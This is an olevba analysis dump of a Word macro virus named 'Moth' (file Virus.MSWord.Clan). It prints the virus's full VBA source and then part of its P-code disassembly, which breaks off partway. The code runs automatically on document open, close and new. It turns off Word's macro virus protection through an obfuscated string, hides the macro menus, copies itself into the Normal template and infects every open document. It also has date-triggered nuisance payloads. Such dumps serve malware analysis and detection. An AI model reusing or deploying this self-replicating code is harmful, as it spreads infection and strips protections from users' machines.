olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Clan
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO MothD.cls 
in file: Virus.MSWord.Clan - OLE stream: 'Macros/VBA/MothD'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub Document_Open()
On Error Resume Next
CommandBars("Macro").Enabled = False
CommandBars("Visual basic").Enabled = False
a$ = Chr$(70): b$ = Chr$(97): c$ = Chr$(108): d$ = Chr$(115): e$ = Chr$(101): setings$ = a$ + b$ + c$ + d$ + e$
Application.Options.VirusProtection = setings$
Set M01 = ActiveDocument.VBProject.VBComponents.Item(1)
Set M02 = NormalTemplate.VBProject.VBComponents.Item(1)
M03 = M02.CodeModule.CountOfLines
M04 = M01.CodeModule.CountOfLines
M05 = Application.Documents.Count
If M03 > 0 Then
If M02.Name <> "MothN" Then
M02.CodeModule.DeleteLines 1, M03
End If
End If
If M03 = 0 Then
M02.CodeModule.InsertLines 1, M01.CodeModule.Lines(1, M04)
End If
If M02.Name <> "MothN" Then
M02.Name = "MothN"
a$ = Chr(34)
For dny = 1 To 9
If dny = 1 Then doble = "Sub AutoNew()"
If dny = 2 Then doble = "Document_Open"
If dny = 3 Then doble = "End Sub"
If dny = 4 Then doble = "Sub ViewVBCode()"
If dny = 5 Then doble = "MsgBox " + a$ + "It's Moth" + a$ + ", vbOKOnly," + a$ + "No Bom-Bom, no Kiss-Kiss!" + a$
If dny = 6 Then doble = "End Sub"
If dny = 7 Then doble = "Sub ToolsMacro()"
If dny = 8 Then doble = "MsgBox " + a$ + "It's Moth" + a$ + ", vbOKOnly," + a$ + "No Bom-Bom, no Kiss-Kiss!" + a$
If dny = 9 Then doble = "End Sub"
M02.CodeModule.InsertLines dny, doble
Next dny
End If
If NormalTemplate.Saved = False Then NormalTemplate.Save
For infect = 1 To M05
If M01.Name <> "MothD" And M04 > 0 Then
Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.DeleteLines 1, Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.CountOfLines
End If
If Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.CountOfLines = 0 Then
Application.Documents.Item(infect).VBProject.VBComponents.Item(1).CodeModule.InsertLines 1, M02.CodeModule.Lines(10, M03)
End If
Next infect
If M01.Name <> "MothD" Then M01.Name = "MothD"
'Copyright by Inquisitor
'   -=Dead Rat Clan=-
'  Mensk  2001  v.1.8
'Virus name: Moth
a = WeekDay((Now), vbMonday)
If a = 1 And Hour(Now) >= 17 Then
gamername = InputBox("What is you name ?")
If gamername = "Inquisitor" Or gamername = "Inq" Then
Mesg = "Hello boss! :-)": St = vbOKOnly + vbInformation + vbSystemModal
RoR = MsgBox(Mesg, St)
Else
Mesg = gamername + "it is time finish work ?": St = vbYesNo + vbCritical + vbSystemModal
RoR = MsgBox(Mesg, St)
If RoR = 6 Then
Set wrd = GetObject(, "Word.Application")
wrd.Visible = False
End If
End If
End If
If Second(Now) = Day(Now) Then
For amo = 0 To 50
ActiveDocument.Shapes.AddShape(msoShapeOval, 142#, 142#, 276.9, 170.4).Select
Selection.ShapeRange.Line.ForeColor.RGB = RGB(51, 204, 204)
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Line.ForeColor.RGB = RGB(255, 204, 0)
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(153, 204, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 0, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 128, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 153, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(51, 51, 51)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(255, 204, 153)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(0, 0, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(150, 150, 150)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(150, 150, 150)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(51, 51, 0)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 153, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 153, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(51, 153, 102)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(204, 255, 255)
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid
Selection.ShapeRange.Line.ForeColor.RGB = RGB(204, 255, 255)
Selection.ShapeRange.Line.Visible = msoTrue
Selection.ShapeRange.Line.ForeColor.RGB = RGB(51, 51, 0)
Selection.ShapeRange.Line.Visible = msoTrue
Next amo
End If
If Day(Now) = 1 And Month(Now) = 5 Then
ActiveDocument.Shapes.AddTextEffect(msoTextEffect11, "Happy birthday Dead RAT Clan !!!", "Impact", 28#, msoTrue, msoFalse, 136.75, 201.2).Select
End If
If Day(Now) = Month(Now) Then
Selection.TypeText Text:="Dead RAT is BEST!"
Selection.MoveLeft Unit:=wdCharacter, Count:=21, Extend:=wdExtend
Selection.Font.Bold = wdToggle
Selection.Font.Size = 20
Selection.Font.ColorIndex = wdRed
Selection.MoveLeft Unit:=wdCharacter, Count:=4
Selection.Font.ColorIndex = wdBlue
Selection.InsertSymbol Font:="Monotype Sorts", CharacterNumber:=-4054, Unicode:=True
End If
End Sub
Private Sub Document_Close()
Document_Open
End Sub
Private Sub Document_New()
Document_Open
End Sub
Private Sub Document_Exit()
Document_Open
End Sub











-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Clan
' ===============================================================================
' Module streams:
' Macros/VBA/MothD - 9451 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Private Sub Document_Open())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitVarSpecial (False)
' 	LitStr 0x000C "Visual basic"
' 	ArgsLd CommandBars 0x0001 
' 	MemSt Enabled 
' Line #5:
' 	LitDI2 0x0046 
' 	ArgsLd Chr$ 0x0001 
' 	St a$ 
' 	BoS 0x0000 
' 	LitDI2 0x0061 
' 	ArgsLd Chr$ 0x0001 
' 	St B$ 
' 	BoS 0x0000 
' 	LitDI2 0x006C 
' 	ArgsLd Chr$ 0x0001 
' 	St c$ 
' 	BoS 0x0000 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	St d$ 
' 	BoS 0x0000 
' 	LitDI2 0x0065 
' 	ArgsLd Chr$ 0x0001 
' 	St e$ 
' 	BoS 0x0000 
' 	Ld a$ 
' 	Ld B$ 
' 	Add 
' 	Ld c$ 
' 	Add 
' 	Ld d$ 
' 	Add 
' 	Ld e$ 
' 	Add 
' 	St setings$ 
' Line #6:
' 	Ld setings$ 
' 	Ld Application 
' 	MemLd Options 
' 	MemSt VirusProtection 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set M01 
' Line #8:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set M02 
' Line #9:
' 	Ld M02 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St M03 
' Line #10:
' 	Ld M01 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St M04 
' Line #11:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St M05 
' Line #12:
' 	Ld M03 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #13:
' 	Ld M02 
' 	MemLd New 
' 	LitStr 0x0005 "MothN"
' 	Ne 
' 	IfBlock 
' Line #14:
' 	LitDI2 0x0001 
' 	Ld M03 
' 	Ld M02 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld M03 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld M04 
' 	Ld M01 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld M02 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	Ld M02 
' 	MemLd New 
' 	LitStr 0x0005 "MothN"
' 	Ne 
' 	IfBlock 
' Line #21:
' 	LitStr 0x0005 "MothN"
' 	Ld M02 
' 	MemSt New 
' Line #22:
' 	LitDI2 0x0022 
' 	ArgsLd Chr 0x0001 
' 	St a$ 
' Line #23:
' 	StartForVariable 
' 	Ld dny 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0009 
' 	For 
' Line #24:
' 	Ld dny 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Sub AutoNew()"
' 	St doble 
' 	EndIf 
' Line #25:
' 	Ld dny 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x000D "Document_Open"
' 	St doble 
' 	EndIf 
' Line #26:
' 	Ld dny 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "End Sub"
' 	St doble 
' 	EndIf 
' Line #27:
' 	Ld dny 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "Sub ViewVBCode()"
' 	St doble 
' 	EndIf 
' Line #28:
' 	Ld dny 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "MsgBox "
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0009 "It's Moth"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	LitStr 0x000B ", vbOKOnly,"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0019 "No Bom-Bom, no Kiss-Kiss!"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	St doble 
' 	EndIf 
' Line #29:
' 	Ld dny 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "End Sub"
' 	St doble 
' 	EndIf 
' Line #30:
' 	Ld dny 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "Sub ToolsMacro()"
' 	St doble 
' 	EndIf 
' Line #31:
' 	Ld dny 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "MsgBox "
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0009 "It's Moth"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	LitStr 0x000B ", vbOKOnly,"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	LitStr 0x0019 "No Bom-Bom, no Kiss-Kiss!"
' 	Add 
' 	Ld a$ 
' 	Add 
' 	St doble 
' 	EndIf 
' Line #32:
' 	Ld dny 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0007 "End Sub"
' 	St doble 
' 	EndIf 
' Line #33:
' 	Ld dny 
' 	Ld doble 
' 	Ld M02 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #34:
' 	StartForVariable 
' 	Ld dny 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #37:
' 	StartForVariable 
' 	Ld infect 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld M05 
' 	For 
' Line #38:
' 	Ld M01 
' 	MemLd New 
' 	LitStr 0x0005 "MothD"
' 	Ne 
' 	Ld M04 
' 	LitDI2 0x0000 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #39:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	LitDI2 0x0001 
' 	Ld infect 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #42:
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	Ld M03 
' 	Ld M02 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0001 
' 	Ld infect 
' 	Ld Application 
' 	MemLd Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #43:
' 	EndIfBlock 
' Line #44:
' 	StartForVariable 
' 	Ld infect 
' 	EndForVariable 
' 	NextVar 
' Line #45:
' 	Ld M01 
' 	MemLd New 
' 	LitStr 0x0005 "MothD"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0005 "MothD"
' 	Ld M01 
' 	MemSt New 
' 	EndIf 
' Line #46:
' 	QuoteRem 0x0000 0x0017 "Copyright by Inquisitor"
' Line #47:
' 	QuoteRem 0x0000 0x0014 "   -=Dead Rat Clan=-"
' Line #48:
' 	QuoteRem 0x0000 0x0014 "  Mensk  2001  v.1.8"
' Line #49:
' 	QuoteRem 0x0000 0x0010 "Virus name: Moth"
' Line #50:
' 	Ld Now 
' 	Paren 
' 	Ld vbMonday 
' 	ArgsLd WeekDay 0x0002 
' 	St a 
' Line #51:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Hour 0x0001 
' 	LitDI2 0x0011 
' 	Ge 
' 	And 
' 	IfBlock 
' Line #52:
' 	LitStr 0x0012 "What is you name ?"
' 	ArgsLd InputBox 0x0001 
' 	St gamername 
' Line #53:
' 	Ld gamername 
' 	LitStr 0x000A "Inquisitor"
' 	Eq 
' 	Ld gamername 
' 	LitStr 0x0003 "Inq"
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #54:
' 	LitStr 0x000F "Hello boss! :-)"
' 	St Mesg 
' 	BoS 0x0000 
' 	Ld vbOKOnly 
' 	Ld vbInformation 
' 	Add 
' 	Ld vbSystemModal 
' 	Add 
' 	St St 
' Line #55:
' 	Ld Mesg 
' 	Ld St 
' 	ArgsLd MsgBox 0x0002 
' 	St RoR 
' Line #56:
' 	ElseBlock 
' Line #57:
' 	Ld gamername 
' 	LitStr 0x0018 "it is time finish work ?"
' 	Add 
' 	St Mesg 
' 	BoS 0x0000 
' 	Ld vbYesNo 
' 	Ld vbCritical 
' 	Add 
' 	Ld vbSystemModal 
' 	Add 
' 	St St 
' Line #58:
' 	Ld Mesg 
' 	Ld St 
' 	ArgsLd MsgBox 0x0002 
' 	St RoR 
' Line #59:
' 	Ld RoR 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #60:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set wrd 
' Line #61:
' 	LitVarSpecial (False)
' 	Ld wrd 
' 	MemSt Visible 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndIfBlock 
' Line #65:
' 	Ld Now 
' 	ArgsLd Second 0x0001 
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Eq 
' 	IfBlock 
' Line #66:
' 	StartForVariable 
' 	Ld amo 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0032 
' 	For 
' Line #67:
' 	Ld msoShapeOval 
' 	LitR8 0x0000 0x0000 0xC000 0x4061 
' 	LitR8 0x0000 0x0000 0xC000 0x4061 
' 	LitR8 0x6666 0x6666 0x4E66 0x4071 
' 	LitR8 0xCCCD 0xCCCC 0x4CCC 0x4065 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	ArgsMemCall Set 0x0000 
' Line #68:
' 	LitDI2 0x0033 
' 	LitDI2 0x00CC 
' 	LitDI2 0x00CC 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #69:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemSt Visible 
' Line #70:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00CC 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #71:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemSt Visible 
' Line #72:
' 	LitDI2 0x0099 
' 	LitDI2 0x00CC 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #73:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #74:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #75:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #76:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #77:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #78:
' 	LitDI2 0x0000 
' 	LitDI2 0x0080 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #79:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #80:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #81:
' 	LitDI2 0x00CC 
' 	LitDI2 0x0099 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #82:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #83:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #84:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #85:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #86:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #87:
' 	LitDI2 0x0033 
' 	LitDI2 0x0033 
' 	LitDI2 0x0033 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #88:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #89:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #90:
' 	LitDI2 0x00FF 
' 	LitDI2 0x00CC 
' 	LitDI2 0x0099 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #91:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #92:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #93:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #94:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #95:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #96:
' 	LitDI2 0x0096 
' 	LitDI2 0x0096 
' 	LitDI2 0x0096 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #97:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #98:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #99:
' 	LitDI2 0x0096 
' 	LitDI2 0x0096 
' 	LitDI2 0x0096 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #100:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #101:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #102:
' 	LitDI2 0x0033 
' 	LitDI2 0x0033 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #103:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #104:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #105:
' 	LitDI2 0x00CC 
' 	LitDI2 0x0099 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #106:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #107:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #108:
' 	LitDI2 0x00CC 
' 	LitDI2 0x0099 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #109:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #110:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #111:
' 	LitDI2 0x0033 
' 	LitDI2 0x0099 
' 	LitDI2 0x0066 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #112:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #113:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #114:
' 	LitDI2 0x00CC 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #115:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	MemSt Visible 
' Line #116:
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Fill 
' 	ArgsMemCall Solid 0x0000 
' Line #117:
' 	LitDI2 0x00CC 
' 	LitDI2 0x00FF 
' 	LitDI2 0x00FF 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #118:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemSt Visible 
' Line #119:
' 	LitDI2 0x0033 
' 	LitDI2 0x0033 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemLd ForeColor 
' 	MemSt RSet 
' Line #120:
' 	Ld msoTrue 
' 	Ld Selection 
' 	MemLd ShapeRange 
' 	MemLd Like 
' 	MemSt Visible 
' Line #121:
' 	StartForVariable 
' 	Ld amo 
' 	EndForVariable 
' 	NextVar 
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #124:
' 	Ld msoTextEffect11 
' 	LitStr 0x0020 "Happy birthday Dead RAT Clan !!!"
' 	LitStr 0x0006 "Impact"
' 	LitR8 0x0000 0x0000 0x0000 0x403C 
' 	Ld msoTrue 
' 	Ld msoFalse 
' 	LitR8 0x0000 0x0000 0x1800 0x4061 
' 	LitR8 0x6666 0x6666 0x2666 0x4069 
' 	Ld ActiveDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddTextEffect 0x0008 
' 	ArgsMemCall Set 0x0000 
' Line #125:
' 	EndIfBlock 
' Line #126:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	Eq 
' 	IfBlock 
' Line #127:
' 	LitStr 0x0011 "Dead RAT is BEST!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #128:
